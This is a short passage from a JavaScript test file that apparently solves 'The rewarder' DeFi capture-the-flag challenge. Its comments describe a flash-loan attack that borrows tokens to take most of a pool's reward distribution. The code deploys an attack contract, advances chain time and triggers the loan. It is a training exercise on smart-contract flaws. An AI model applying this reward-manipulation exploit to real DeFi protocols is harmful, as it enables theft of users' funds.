...
describe('[Challenge] The rewarder', function () {
    ...
    // The attacker can borrow large amout of liquidityToken from flashLoanPool, deposit to 
    // rewarderPool at an instant when the rewards are distributed (5 days).
    // rewards are proportional to amountDeposited /  totalDeposits, attacker will claim major share
    // and immediately withdraw  liquidityToken from rewarderPool 
    // pay back the flashLoanPool
    // transfer reward tokens to attacker address
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const AttackFactory = await ethers.getContractFactory("AttackRewarderPool", player);
        const attackContract = await AttackFactory.deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, player.address);

        // Advance time 5 days so that attacker can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
        await attackContract.flashLoan(TOKENS_IN_LENDER_POOL);
